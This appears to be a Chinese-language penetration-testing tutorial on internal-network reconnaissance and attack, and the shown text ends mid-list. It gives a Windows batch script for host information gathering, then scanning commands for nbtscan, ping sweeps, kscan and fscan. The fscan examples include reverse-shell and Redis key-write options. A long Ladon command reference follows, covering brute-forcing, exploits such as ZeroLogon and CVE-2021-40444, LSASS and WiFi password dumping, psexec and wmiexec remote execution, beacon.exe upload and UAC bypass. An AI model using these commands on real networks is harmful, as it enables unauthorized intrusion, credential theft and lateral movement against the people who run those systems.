class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="自动收集本地信息"><a href="#自动收集本地信息" class="headerlink" title="自动收集本地信息"></a>自动收集本地信息</h1><h2 id="bat脚本"><a href="#bat脚本" class="headerlink" title="bat脚本"></a>bat脚本</h2><h3 id="bat脚本语法"><a href="#bat脚本语法" class="headerlink" title="bat脚本语法"></a>bat脚本语法</h3><table><thead><tr><th>echo</th><th>表示显示此命令后的字符</th></tr></thead><tbody><tr><td>echo off</td><td>表示在此语句后所有运行的命令都<strong>不显示命令行本身</strong></td></tr><tr><td>@</td><td>与echo off相象，但它是加在每个命令行的最前面，表示运行时<strong>不显示这一行的命令行</strong>（只能影响当前行）。</td></tr><tr><td>call</td><td><strong>调用另一个批处理文件</strong>（如果不用call而直接调用别的批处理文件，那么执行完那个批处理文件后将无法返回当前文件并执行当前文件的后续命令）。</td></tr><tr><td>pause</td><td>运行此句会<strong>暂停</strong>批处理的执行并在屏幕上显示Press any key to continue…的提示，等待用户按任意键后继续</td></tr><tr><td>rem</td><td>表示此命令后的字符为解释行（<strong>注释</strong>），不执行，只是给自己今后参考用的（相当于程序中的注释）。</td></tr><tr><td>&gt;</td><td>输出，覆盖</td></tr><tr><td>&gt;&gt;</td><td>追加</td></tr></tbody></table><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><pre class="line-numbers language-none"><code class="language-none">@echo off　　　　　　　　　　 不显示后续命令行及当前命令行dir c:\*.* &gt;a.txt　　　　　　 将c盘文件列表写入a.txtcall c:\ucdos\ucdos.bat　　　 调用ucdosecho 你好 　　　　　　　　　　 显示"你好"pause 　　　　　　　　　　　　 暂停,等待按键继续rem 准备运行wps 　　　　　　　 注释：准备运行wpscd ucdos　　　　　　　　　　　 进入ucdos目录wps 　　　　　　　　　　　　　 运行wpsecho 123 &gt;1.txt 输出123到1.txtecho 456 &gt;&gt;1.txt 追加456到1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">@echo offecho -------------------------------------------------&gt;&gt;1.txtipconfig &gt;&gt;1.txtecho -------------------------------------------------&gt;&gt;1.txtsysteminfo | findstr /B /C:"OS Name" /C:"OS Version" &gt;&gt;1.txtsysteminfo| findstr /B /C:"OS 名称" /C:"OS 版本" &gt;&gt;1.txtecho -------------------------------------------------&gt;&gt;1.txtecho %PROCESSOR_ARCHITECTURE% &gt;&gt;1.txtecho -------------------------------------------------&gt;&gt;1.txtwmic service list brief &gt;&gt;1.txtecho -------------------------------------------------&gt;&gt;1.txtwmic process list brief &gt;&gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自动信息收集就是将之前讲的命令写成bat脚本运行，省去了我们手工的麻烦</p><h2 id="其他脚本"><a href="#其他脚本" class="headerlink" title="其他脚本"></a>其他脚本</h2><p>以下的脚本帮助我们辅助完成工作</p><pre class="line-numbers language-none"><code class="language-none">for /f "delims=" %%A in ('dir /s /b %WINDIR%\system32\*htable.xsl') do set "var=%%A"wmic process get CSName,Description,ExecutablePath,ProcessId /format:"%var%" &gt;&gt; out.htmlwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:"%var%" &gt;&gt; out.htmlwmic USERACCOUNT list full /format:"%var%" &gt;&gt; out.htmlwmic group list full /format:"%var%" &gt;&gt; out.htmlwmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:"%var%" &gt;&gt; out.htmlwmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:"%var%" &gt;&gt; out.htmlwmic netuse list full /format:"%var%" &gt;&gt; out.htmlwmic qfe get Caption,Description,HotFixID,InstalledOn /format:"%var%" &gt;&gt; out.htmlwmic startup get Caption,Command,Location,User /format:"%var%" &gt;&gt; out.htmlwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:"%var%" &gt;&gt; out.htmlwmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:"%var%" &gt;&gt; out.htmlwmic Timezone get DaylightName,Description,StandardName /format:"%var%" &gt;&gt; out.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="内网IP扫描技术"><a href="#内网IP扫描技术" class="headerlink" title="内网IP扫描技术"></a>内网IP扫描技术</h1><h2 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h2><p>这是一款用于扫描Windows网络上NetBIOS名字信息的程序。该程序对给出范围内的每一个地址发 送NetBIOS状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan列出 它的IP地址、NetBIOS计算机名、登录用户名和MAC地址。但只能用于局域网,<strong>NBTSCAN</strong>可以取到 PC的真实IP地址和MAC地址，如果有”ARP攻击”在做怪，可以找到装有ARP攻击的PC的IP/和 MAC地址。但只能用于<strong>局域网</strong> </p><p>下载地址 <a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a> </p><p>用法：nbtscan.exe + IP</p><p><img src="assets/image-20221230115829610.png" alt="image-20221230115829610"></p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>除了利用NetBIOS探测内网，还可以利用ICMP协议探测内网。依次对内网中的每个IP地址执行ping 命令，可以快速找出内网中所有存活酌主机。在渗透测试中中，可以使用如下命令<strong>循环探测</strong>整个C段</p><pre class="line-numbers language-none"><code class="language-none">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.70.%I | findstr "TTL="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230115856253.png" alt="image-20221230115856253"></p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><p>使用arp协议进行IP探测</p><pre class="line-numbers language-none"><code class="language-none">arp.exe -t 192.168.70.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230115929175.png" alt="image-20221230115929175"></p><h2 id="Kscan"><a href="#Kscan" class="headerlink" title="Kscan"></a>Kscan</h2><p>kscan是一款资产]测绘工具，可针对指定资产进行端口扫描以及TCP指纹识别和Banner抓取，在不 发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴力破解， 且是go平台首款开源的RDP暴力破解工具 </p><p>下载地址 <a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a> </p><p>用法</p><pre class="line-numbers language-none"><code class="language-none">usage: kscan [-h,--help,--fofa-syntax] (-t,--target,-f,--fofa,--touch,--spy) [-p,--port|--top] [-o,--output] [-oJ] [--proxy] [--threads] [--path] [--host] [--timeout] [-Pn] [-Cn] [-sV] [--check] [--encoding] [--hydra] [hydra options] [fofa options]optional arguments: -h , --help show this help message and exit -f , --fofa 从fofa获取检测对象，需提前配置环境变量:FOFA_EMAIL、FOFA_KEY  -t , --target 指定探测对象： IP地址：114.114.114.114 IP地址段：114.114.114.114/24,不建议子网掩码小于12 IP地址段：114.114.114.114-115.115.115.115 URL地址：https://www.baidu.com 文件地址：file:/tmp/target.txt  --spy 网段探测模式，此模式下将自动探测主机可达的内网网段可接收参数为： (空)、192、10、172、all、指定IP地址(将探测该IP地址B段存活网关)  --check 针对目标地址做指纹识别，仅不会进行端口探测 --scan 将针对--fofa、--spy提供的目标对象，进行端口扫描和指纹识别 --touch 获取指定端口返回包，可以使用此次参数获取返回包，完善指纹库，格式为：IP:PORT -p , --port 扫描指定端口，默认会扫描TOP400，支持：80,8080,8088-8090 -o , --output 将扫描结果保存到文件 -oJ 将扫描结果使用json格式保存到文件 -Pn 使用此参数后，将不会进行智能存活性探测，现在默认会开启智能存活性探测，提高效率 -Cn 使用此参数后，控制台输出结果将不会带颜色 -Dn 使用此参数后，将关闭CDN识别功能 -sV 使用此参数后，将对所有端口进行全探针探测，此参数极度影响效率，慎用！ --top 扫描经过筛选处理的常见端口TopX，最高支持1000个，默认为TOP400 --proxy 设置代理(socks5|socks4|https|http)://IP:Port --threads 线程参数,默认线程100,最大值为2048 --path 指定请求访问的目录，只支持单个目录 --host 指定所有请求的头部Host值 --timeout 设置超时时间 --encoding 设置终端输出编码，可指定为：gb2312、utf-8 --match 对资产返回banner进行检索，存在关键字的，才会显示，否则不会显示 --hydra 自动化爆破支持协议：ssh,rdp,ftp,smb,mysql,mssql,oracle,postgresql,mongodb,redis,默认会开启全部hydra options: --hydra-user 自定义hydra爆破用户名:username or user1,user2 or file:username.txt --hydra-pass 自定义hydra爆破密码:password or pass1,pass2 or file:password.txt 若密码中存在使用逗号的情况，则使用\,进行转义，其他符号无需转义 --hydra-update 自定义用户名、密码模式，若携带此参数，则为新增模式，会将用户名和密码补充在默认字典后面。否则将替换默认字典。 --hydra-mod 指定自动化暴力破解模块:rdp or rdp,ssh,smb fofa options: --fofa-syntax 将获取fofa搜索语法说明 --fofa-size 将设置fofa返回条目数，默认100条 --fofa-fix-keyword 修饰keyword，该参数中的{}最终会替换成-f参数的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">kscan.exe -t 192.168.70.0/24#出现乱码时输入kscan.exe -t 192.168.70.0/24 --encoding gb2312<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230120034977.png" alt="image-20221230120034977"></p><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服 务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、 web漏洞扫描、netbios探测、域控识别等功能。</p><pre class="line-numbers language-none"><code class="language-none">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描) fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥) fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)fscan.exe -hf ip.txt (以文件导入)fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230120123061.png" alt="image-20221230120123061"></p><h2 id="ladon"><a href="#ladon" class="headerlink" title="ladon"></a>ladon</h2><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密 码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主 机、域名列表扫描。7.5版本内置100个功能模块,外部模块18个,通过多种协议以及方法快速获取目标 网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间 件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、 ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、 SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、 BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec /jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度 自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配 置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支 持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p><pre class="line-numbers language-none"><code class="language-none">### 001 自定义线程扫描例子：扫描目标10.1.2段是否存在MS17010漏洞单线程：Ladon 10.1.2.8/24 MS17010 t=180线程：Ladon noping 10.1.2.8/24 MS17010 t=80在高强度防护下的网络默认线程无法扫描，必须单线程### 002 Socks5代理扫描例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）Ladon noping 10.1.2.8/24 MS17010详见：http://k8gege.org/Ladon/proxy.html### 003 网段扫描/批量扫描CIDR格式：不只是/24/16/8(所有)Ladon 192.168.1.8/24 扫描模块Ladon 192.168.1.8/16 扫描模块Ladon 192.168.1.8/8 扫描模块字母格式：仅C段B段A段 顺序排序Ladon 192.168.1.8/c 扫描模块Ladon 192.168.1.8/b 扫描模块Ladon 192.168.1.8/a 扫描模块TXT格式##### 004 ICMP批量扫描C段列表存活主机Ladon ip24.txt ICMP##### 005 ICMP批量扫描B段列表存活主机Ladon ip16.txt ICMP##### 006 ICMP批量扫描cidr列表(如某国IP段)Ladon cidr.txt ICMP##### 007 ICMP批量扫描域名是否存活Ladon domain.txt ICMP##### 008 ICMP批量扫描机器是否存活Ladon host.txt ICMP##### 009 批量识别URL列表CMSLadon url.txt WhatCMS##### 010 批量检测DrayTek路由器版本、漏洞、弱口令Ladon url.txt DraytekPoc##### 011 批量解密Base64密码Ladon str.txt DeBase64### 资产扫描、指纹识别、服务识别、存活主机、端口扫描##### 012 ICMP扫描存活主机(最快)Ladon 192.168.1.8/24 ICMP##### 013 Ping探测存活主机(调用系统Ping命令 回显ms、ttl等信息)Ladon 192.168.1.8/24 Ping##### 014 多协议探测存活主机 （IP、机器名、MAC/域名、制造商/系统版本）Ladon 192.168.1.8/24 OnlinePC##### 015 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）Ladon 192.168.1.8/24 OsScan##### 016 OXID探测多网卡主机Ladon 192.168.1.8/24 EthScanLadon 192.168.1.8/24 OxidScan##### 017 DNS探测多网卡主机Ladon 192.168.1.8/24 DnsScan##### 018 多协议扫描存活主机IPLadon 192.168.1.8/24 OnlineIP##### 019 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）Ladon 192.168.1.8/24 MS17010##### 020 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）Ladon 192.168.1.8/24 SMBGhost##### 021 扫描Web信息/Http服务Ladon 192.168.1.8/24 WebScan##### 022 扫描C段站点URL域名Ladon 192.168.1.8/24 UrlScan##### 023 扫描C段站点URL域名Ladon 192.168.1.8/24 SameWeb##### 024 扫描子域名、二级域名Ladon baidu.com SubDomain##### 025 域名解析IP、主机名解析IPLadon baidu.com DomainIPLadon baidu.com HostIP##### 026 DNS查询域内机器、IP (条件域内)Ladon AdiDnsDump 192.168.1.8 (Domain IP)##### 027 查询域内机器、IP (条件域内)Ladon GetDomainIP##### 028 扫描C段端口、指定端口扫描Ladon 192.168.1.8/24 PortScanLadon 192.168.1.8 PortScan 80,445,3389##### 029 扫描C段WEB及识别CMS（86+Web指纹识别）Ladon 192.168.1.8/24 WhatCMS##### 030 扫描思科设备Ladon 192.168.1.8/24 CiscoScanLadon http://192.168.1.8 CiscoScan##### 031 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）Ladon EnumMssql##### 032 枚举网络共享资源 （域、IP、主机名\共享路径）Ladon EnumShare##### 033 扫描LDAP服务器(探测域控)Ladon 192.168.1.8/24 LdapScan##### 034 扫描FTP服务器Ladon 192.168.1.8/24 FtpScan### 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆密码爆破详解参考SSH：http://k8gege.org/Ladon/sshscan.html##### 035 445端口 SMB密码爆破(Windows)Ladon 192.168.1.8/24 SmbScan##### 036 135端口 Wmi密码爆破(Windowns)Ladon 192.168.1.8/24 WmiScan##### 037 389端口 LDAP服务器、AD域密码爆破(Windows)Ladon 192.168.1.8/24 LdapScan##### 038 5985端口 Winrm密码爆破(Windowns)Ladon 192.168.1.8/24 WinrmScan.ini##### 039 445端口 SMB NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 SmbHashScan##### 040 135端口 Wmi NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 WmiHashScan##### 041 22端口 SSH密码爆破(Linux)Ladon 192.168.1.8/24 SshScanLadon 192.168.1.8:22 SshScan##### 042 1433端口 Mssql数据库密码爆破Ladon 192.168.1.8/24 MssqlScan##### 043 1521端口 Oracle数据库密码爆破Ladon 192.168.1.8/24 OracleScan##### 044 3306端口 Mysql数据库密码爆破Ladon 192.168.1.8/24 MysqlScan##### 045 7001端口 Weblogic后台密码爆破Ladon http://192.168.1.8:7001/console WeblogicScanLadon 192.168.1.8/24 WeblogicScan##### 046 5900端口 VNC远程桌面密码爆破Ladon 192.168.1.8/24 VncScan##### 047 21端口 Ftp服务器密码爆破Ladon 192.168.1.8/24 FtpScan##### 048 8080端口 Tomcat后台登陆密码爆破Ladon 192.168.1.8/24 TomcatScanLadon http://192.168.1.8:8080/manage TomcatScan##### 049 Web端口 401基础认证密码爆破Ladon http://192.168.1.8/login HttpBasicScan##### 050 445端口 Impacket SMB密码爆破(Windowns)Ladon 192.168.1.8/24 SmbScan.ini##### 051 445端口 IPC密码爆破(Windowns)Ladon 192.168.1.8/24 IpcScan.ini##### 052 139端口Netbios协议Windows密码爆破Ladon 192.168.1.8/24 NbtScan##### 053 5985端口Winrm协议Windows密码爆破Ladon 192.168.1.8/24 WinrmScan##### 054 网络摄像头密码爆破(内置默认密码)Ladon 192.168.1.8/24 DvrScan### 漏洞检测/Poc##### 055 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144)Ladon 192.168.1.8/24 MS17010##### 056 SMBGhost漏洞检测 CVE-2020-0796Ladon 192.168.1.8/24 SMBGhost##### 057 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)Ladon 192.168.1.8/24 WeblogicPoc##### 058 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)Ladon 192.168.1.8/24 PhpStudyPoc##### 059 ActiveMQ漏洞检测(CVE-2016-3088)Ladon 192.168.1.8/24 ActivemqPoc##### 060 Tomcat漏洞检测(CVE-2017-12615)Ladon 192.168.1.8/24 TomcatPoc##### 061 Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)Ladon 192.168.1.8/24 Struts2Poc##### 062 DraytekPoc CVE-2020-8515漏洞检测、Draytek版本探测、弱口令检测Ladon 192.168.1.8 DraytekPocLadon 192.168.1.8/24 DraytekPoc### 漏洞利用/Exploit##### 063 Weblogic漏洞利用(CVE-2019-2725)Ladon 192.168.1.8/24 WeblogicExp##### 064 Tomcat漏洞利用(CVE-2017-12615)Ladon 192.168.1.8/24 TomcatExp##### 065 Windows 0day漏洞通用DLL注入执行CMD生成器(DLL仅5KB)Ladon CmdDll x86 calcLadon CmdDll x64 calcLadon CmdDll b64x86 YwBhAGwAYwA=Ladon CmdDll b64x64 YwBhAGwAYwA=##### 066 CVE-2021-40444 微软IE/Office 0day漏洞Ladon CVE-2021-40444 MakeCab poc.dllLadon CVE-2021-40444 MakeHtml http://192.168.1.8##### 067 DraytekExp CVE-2020-8515远程执行命令EXPLadon DraytekExp http://192.168.1.8 whoami##### 068 ZeroLogon CVE-2020-1472域控提权(密码置空)Ladon ZeroLogon dc.k8gege.org##### 069 CVE-2020-0688 Exchange序列化漏洞(.net 4.0)Ladon cve-2020-0688 192.168.1.142 Administrator K8gege520##### 070 ForExec循环漏洞利用(Win10永恒之黑CVE-2020-0796,成功退出以免目标蓝屏)Ladon ForExec "CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.txt" 80 "Exploit finnished"### 文件下载、文件传输##### 071 HTTP下载Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar##### 072 Ftp下载Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe### 加密解密(HEX/Base64)##### 073 Hex加密解密Ladon 123456 EnHexLadon 313233343536 DeHex##### 074 Base64加密解密Ladon 123456 EnBase64Ladon MTIzNDU2 DeBase64### 网络嗅探##### 075 Ftp密码嗅探Ladon FtpSniffer 192.168.1.5##### 076 HTTP密码嗅探Ladon HTTPSniffer 192.168.1.5##### 077 网络嗅探Ladon Sniffer### 密码读取##### 078 读取IIS站点密码、网站路径Ladon IISpwd##### 079 读取连接过的WIFI密码Ladon WifiPwd##### 080 读取FileZilla FTP密码Ladon FileZillaPwd##### 081 读取系统Hash、VPN密码、DPAPI-KeyLadon CVE-2021-36934##### 082 DumpLsass内存密码(mimikatz明文) 限9.1.1版本之前Ladon DumpLsass### 信息收集##### 083 获取本机内网IP与外网IPLadon GetIP##### 084 获取PCname GUID CPUID DiskID Mac地址Ladon GetID##### 085 查看用户最近访问文件Ladon Recent##### 086 USB使用记录查看(USB名称、USB标记、路径信息)Ladon UsbLog##### 087 检测后门(注册表启动项、DLL劫持)Ladon CheckDoorLadon AutoRun##### 088 进程详细信息(程序路径、位数、启动参数、用户)Ladon EnumProcessLadon Tasklist##### 089 获取命令行参数Ladon cmdlineLadon cmdline cmd.exe##### 090 获取渗透基础信息Ladon GetInfoLadon GetInfo2##### 091 .NET &amp; PowerShell版本Ladon NetVerLadon PSverLadon NetVersionLadon PSversion##### 092 运行时版本&amp;编译环境Ladon VerLadon Version##### 093 运行时版本&amp;编译环境&amp;安装软件列表Ladon AllVerLadon AllVersion##### 094 查看IE代理信息Ladon QueryProxy##### 095 列目录Ladon DirList 默认列全盘Ladon DirList c:\ 指定盘符或目录##### 096 QueryAdmin查看管理员用户Ladon QueryAdmin##### 097 查看本机命名管道Ladon GetPipe##### 098 RdpLog查看3389连接记录Ladon RdpLog### 远程执行(psexec/wmiexec/atexec/sshexec/smbexec)##### 099 445端口 加密PSEXEC远程执行命令（交互式）net user \\192.168.1.8 k8gege520 /user:k8gegeLadon psexec 192.168.1.8psexec&gt; whoamint authority\system##### 100 135端口 WmiExec远程执行命令 （非交互式）Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami (8.2前用法)Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami (8.2后用法)Ladon wmiexec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p (8.2后用法)##### 101 445端口 AtExec远程执行命令（非交互式）Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami##### 102 22端口 SshExec远程执行命令（非交互式）Ladon SshExec 192.168.1.8 k8gege k8gege520 whoamiLadon SshExec 192.168.1.8 22 k8gege k8gege520 whoami##### 103 JspShell远程执行命令（非交互式）Usage：Ladon JspShell type url pwd cmdExample: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami##### 104 WebShell远程执行命令（非交互式）```BashUsage：Ladon WebShell ScriptType ShellType url pwd cmdExample: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoamiExample: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoamiExample: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami##### 105 135端口 WmiExec2远程执行命令 （非交互式）支持文件上传Usage:Ladon WmiExec2 host user pass cmd whoamiLadon WmiExec2 pth host cmd whoamiBase64Cmd for Cobalt StrikeLadon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkALadon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkAUpload:Ladon WmiExec2 host user pass upload beacon.exe ceacon.exeLadon WmiExec2 pth host upload beacon.exe ceacon.exe##### 106 445端口 SmbExec Ntlm-Hash非交互式远程执行命令(无回显)Ladon SmbExec 192.168.1.8 k8gege k8gege520 cmd whoamiLadon SmbExec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p##### 107 WinrmExec远程执行命令无回显（支持System权限）Ladon WinrmExec 192.168.1.8 5985 k8gege.org Administrator K8gege520 calc.exe### 提权降权##### 108 whoami查看当前用户权限以及特权Ladon whoami##### 109 6种白名单BypassUAC(8.0后)Win7-Win10用法: Ladon BypassUAC Method Base64CmdLadon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhlLadon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhlLadon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhlLadon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhlLadon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhlLadon BypassUAC dikcleanup 